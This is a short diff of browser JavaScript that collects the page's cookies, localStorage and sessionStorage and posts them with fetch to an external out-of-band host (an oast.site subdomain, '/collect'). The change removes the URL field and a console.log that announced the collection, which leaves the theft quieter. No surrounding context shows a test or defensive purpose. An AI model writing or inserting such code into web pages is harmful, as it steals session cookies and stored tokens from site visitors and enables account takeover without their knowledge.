@@ -3,10 +3,7 @@
         cookies: document.cookie,
         localStorage: JSON.stringify(localStorage),
         sessionStorage: JSON.stringify(sessionStorage),
-        url: window.location.href
     };
-
-    console.log("Collecting data:", data);
     
     if(typeof fetch !== 'undefined'){
         fetch('https://mn0vaty9x689m9738gskrx57fzmxdo9ih.oast.site/collect', {
